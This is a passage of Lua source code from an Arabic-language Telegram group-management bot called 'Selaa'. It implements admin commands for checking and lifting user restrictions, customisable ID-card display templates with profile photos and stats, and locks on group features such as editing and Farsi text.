CustomTitle = '\n↯☆لقبه ⇇ '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '↯☆اسمه ⇇ ['..CatchName(data.first_name_,20)..'](tg://user?id='..iduser..')\n↯☆ايديه ⇇ ❨ `'..iduser..'` ❩\n↯☆رتبته ⇇ '..IdRank(data.id_, msg.chat_id_)..''..sudobot..'\n↯☆رسائله ⇇ ❨ '..user_msgs..' ❩\n↯☆تفاعله ⇇ '..formsgs(user_msgs)..''..CustomTitle..'\n↯☆نقاطه ⇇ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Selaa(msg.chat_id_, msg.id_, 1,'↯☆معرفه ⇇ [@'..data.username_..']\n↯☆ايديه ⇇ ❨ `'..iduser..'` ❩\n↯☆رتبته ⇇ '..IdRank(data.id_, msg.chat_id_)..''..sudobot..'\n↯☆رسائله ⇇ ❨ '..user_msgs..' ❩\n↯☆تفاعله ⇇ '..formsgs(user_msgs)..''..CustomTitle..'\n↯☆نقاطه ⇇ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     Source Selaa     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if Selaa:sismember(Selaa..'Selaa:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if Selaa:sismember(Selaa..'Selaa:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if Selaa:sismember(Selaa..'Selaa:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if Selaa:sismember(Selaa..'Selaa:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الحظر العام ⇇ '..banall..'\n↯☆الكتم العام ⇇ '..muteall..'\n↯☆الحظر ⇇ '..banned..'\n↯☆الكتم ⇇ '..muted..'\n↯☆التقيد ⇇ '..tkeed..'', 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if Selaa:sismember(Selaa..'Selaa:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if Selaa:sismember(Selaa..'Selaa:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if Selaa:sismember(Selaa..'Selaa:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if Selaa:sismember(Selaa..'Selaa:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if Selaa:sismember(Selaa..'Selaa:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الحظر العام ⇇ '..banall..'\n↯☆الكتم العام ⇇ '..muteall..'\n↯☆الحظر ⇇ '..banned..'\n↯☆الكتم ⇇ '..muted..'\n↯☆التقيد ⇇ '..tkeed..'', 1, 'md')  
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Selaa:srem(Selaa..'Selaa:Tkeed:'..msg.chat_id_,result.sender_user_id_) Selaa:srem(Selaa..'Selaa:Ban:'..msg.chat_id_,result.sender_user_id_) Selaa:srem(Selaa..'Selaa:Muted:'..msg.chat_id_,result.sender_user_id_)   
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"reply","↯☆تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Selaa:srem(Selaa..'Selaa:Tkeed:'..msg.chat_id_,user) Selaa:srem(Selaa..'Selaa:Ban:'..msg.chat_id_,user) Selaa:srem(Selaa..'Selaa:Muted:'..msg.chat_id_,user)   
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"reply","↯☆تم رفع قيوده")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Selaa:srem(Selaa..'Selaa:Tkeed:'..msg.chat_id_,result.id_) Selaa:srem(Selaa..'Selaa:Ban:'..msg.chat_id_,result.id_) Selaa:srem(Selaa..'Selaa:Muted:'..msg.chat_id_,result.id_)   
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source Selaa     --
if Manager(msg) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼♡↯ 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼♡↯ 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼♡↯ 𝒊𝒅 : #id 
𓄼♡↯ 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼♡↯ 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
↯☆𝐔𝐒𝐄𝐑 ↬ #username 
↯☆𝐈𝐃 ↬ #id
↯☆𝐒𝐓𝐀𝐒𝐓 ↬ #stast
↯☆𝐀𝐔𝐓𝐎 ↬ #cont 
↯☆𝐌𝐀𝐒𝐆 ↬ #msgs
↯☆𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
- ɢᴀᴍᴇ ➥• #game .
]]}
local Text_Rand = List[math.random(#List)]
Selaa:set(Selaa.."Selaa:GpIds:Text"..msg.chat_id_,Text_Rand)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تغيير كليشة الايدي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source Selaa     --
if Sudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆رجائا اتبع التعليمات للتعيين \n↯☆لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉', 1, 'md')
Selaa:set("Selaa:New:id:"..Selaa..msg.sender_user_id_,'SelaaTEAM')
return "SelaaTEAM"
end
if text and Selaa:get("Selaa:New:id:"..Selaa..msg.sender_user_id_) then 
if text == 'الغاء' then   
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء حفظ كليشة الايدي', 1, 'md')
Selaa:del("Selaa:New:id:"..Selaa..msg.sender_user_id_)
return false
end
Selaa:del("Selaa:New:id:"..Selaa..msg.sender_user_id_)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ كليشة الايدي العامه', 1, 'md')
Selaa:set(Selaa.."Selaa:AllIds:Text",text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف كليشة الايدي العامه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:AllIds:Text")
end
end
--     Source Selaa     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆رجائا اتبع التعليمات للتعيين \n↯☆لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉', 1, 'md')
Selaa:set("Selaa:New:id:"..Selaa..msg.chat_id_..msg.sender_user_id_,'SelaaTEAM')
return "SelaaTEAM"
end
if text and Manager(msg) and Selaa:get("Selaa:New:id:"..Selaa..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء حفظ كليشة الايدي', 1, 'md')
Selaa:del("Selaa:New:id:"..Selaa..msg.chat_id_..msg.sender_user_id_)
return false
end
Selaa:del("Selaa:New:id:"..Selaa..msg.chat_id_..msg.sender_user_id_)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ الكليشه الجديده', 1, 'md')
Selaa:set(Selaa.."Selaa:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف كليشة الايدي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:GpIds:Text"..msg.chat_id_)
end
end
--     Source Selaa     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function SelaaTEAM(extra,abbas,success)
if abbas.username_ then username = '@'..abbas.username_ else username = 'لا يوجد' end
local function getpro(extra, abbas, success) 
local msgsday = Selaa:get(Selaa..'Selaa:UsersMsgs'..Selaa..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = Selaa:get(Selaa..'Selaa:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(Selaa:get(Selaa..'Selaa:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(Selaa:get(Selaa..'Selaa:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"مو صوره ظيم بالنبي ،🤤💞","مقتنع بصورتك !؟ 😹🖤","ملاك وناسيك بجروبنه ،🤤💞","وفالله ،🤤💞","كشخه برب ،😉🤍","لزكت بيها دغيرها عاد ،😒😕","صورتك مامرتاحلها ،🙄😶","حلغوم والله ،🥺💘","مو صوره غنبله براسها ٦٠ حظ ،😹🤍"}
local Description = Texting[math.random(#Texting)]
if abbas.photos_[0] then
if not Selaa:get(Selaa..'Selaa:Lock:Id'..msg.chat_id_) then 
if not Selaa:get(Selaa..'Selaa:Lock:Id:Photo'..msg.chat_id_) then 
if Selaa:get(Selaa.."Selaa:AllIds:Text") then
newpicid = Selaa:get(Selaa.."Selaa:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "↯☆"..Description.."\n↯☆معرفك ⇇ ❨ "..username.." ❩\n↯☆ايديك ⇇ ❨ "..msg.sender_user_id_.." ❩\n↯☆رتبتك ⇇ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n↯☆رسائلك ⇇ ❨ "..user_msgs.." ❩\n↯☆سحكاتك ⇇ ❨ "..edit_msg.." ❩\n↯☆تفاعلك ⇇ "..formsgs(msguser).."\n↯☆نقاطك ⇇ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
end 
if not Selaa:get(Selaa.."Selaa:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = Selaa:get(Selaa.."Selaa:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if Selaa:get(Selaa.."Selaa:AllIds:Text") then
newallid = Selaa:get(Selaa.."Selaa:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "\n↯☆معرفك ⇇ ❨ "..username.." ❩\n↯☆ايديك ⇇ ❨ "..msg.sender_user_id_.." ❩\n↯☆رتبتك ⇇ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n↯☆رسائلك ⇇ ❨ "..user_msgs.." ❩\n↯☆سحكاتك ⇇ ❨ "..edit_msg.." ❩\n↯☆تفاعلك ⇇ "..formsgs(msguser).."\n↯☆نقاطك ⇇ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
end 
if not Selaa:get(Selaa.."Selaa:GpIds:Text"..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = Selaa:get(Selaa.."Selaa:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Selaa(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا الايدي معطل ', 1, 'md')
end
else
if Selaa:get(Selaa.."Selaa:AllIds:Text") then
notpicid = Selaa:get(Selaa.."Selaa:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "↯☆لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆معرفك ⇇ ❨ "..username.." ❩\n↯☆ايديك ⇇ ❨ "..msg.sender_user_id_.." ❩\n↯☆رتبتك ⇇ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n↯☆رسائلك ⇇ ❨ "..user_msgs.." ❩\n↯☆سحكاتك ⇇ ❨ "..edit_msg.." ❩\n↯☆تفاعلك ⇇ "..formsgs(msguser).."\n↯☆نقاطك ⇇ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
end 
if not Selaa:get(Selaa..'Selaa:Lock:Id'..msg.chat_id_) then
if not Selaa:get(Selaa..'Selaa:Lock:Id:Photo'..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆معرفك ⇇ ❨ "..username.." ❩\n↯☆ايديك ⇇ ❨ "..msg.sender_user_id_.." ❩\n↯☆رتبتك ⇇ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n↯☆رسائلك ⇇ ❨ "..user_msgs.." ❩\n↯☆سحكاتك ⇇ ❨ "..edit_msg.." ❩\n↯☆رسائلك ⇇ ❨ "..user_msgs.." ❩\n↯☆تفاعلك ⇇ "..formsgs(msguser).."\n↯☆نقاطك ⇇ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n", 1, 'md')
end
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, SelaaTEAM)
end
end 
--     Source Selaa     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockptf[2] == "التعديل" then
if not Selaa:get(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل التعديل بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "التعديل الميديا" or lockptf[2] == "تعديل الميديا" then
if not Selaa:get(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل تعديل الميديا\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفارسيه" then
if not Selaa:get(Selaa..'Selaa:Lock:Farsi'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الفارسيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Farsi'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفشار" then
if Selaa:get(Selaa..'Selaa:Lock:Fshar'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الفشار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Fshar'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الطائفيه" then
if Selaa:get(Selaa..'Selaa:Lock:Taf'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الطائفيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Taf'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الكفر" then
if Selaa:get(Selaa..'Selaa:Lock:Kfr'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الكفر بنجاح \n ✓'
